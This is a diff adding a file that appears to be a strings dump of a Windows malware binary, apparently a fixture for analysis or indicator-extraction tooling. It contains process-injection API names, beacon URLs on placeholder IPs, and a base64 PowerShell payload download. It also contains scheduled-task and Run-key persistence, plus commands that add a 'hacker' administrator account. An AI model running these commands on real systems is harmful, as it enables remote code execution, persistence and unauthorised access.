@@ -1,0 +1,30 @@
+!This program cannot be run in DOS mode.
+.text
+.rdata
+.data
+.reloc
+kernel32.dll
+ntdll.dll
+VirtualAlloc
+VirtualProtect
+CreateProcessA
+WriteProcessMemory
+GetProcAddress
+LoadLibraryA
+cmd.exe /c whoami
+C:\Windows\Temp\svchost.exe
+https://203.0.113.42:8443/beacon
+https://198.51.100.10/updates/config.bin
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+WindowsUpdate
+Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+powershell -NonInteractive -WindowStyle Hidden
+Invoke-Expression
+SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4AMQAwAC8AcABhAHkAbABvAGEAZAA=
+10.0.0.50
+203.0.113.42
+198.51.100.10
+admin@contoso.com
+schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\update.exe" /sc onlogon
+net user hacker Password123! /add
+net localgroup Administrators hacker /add
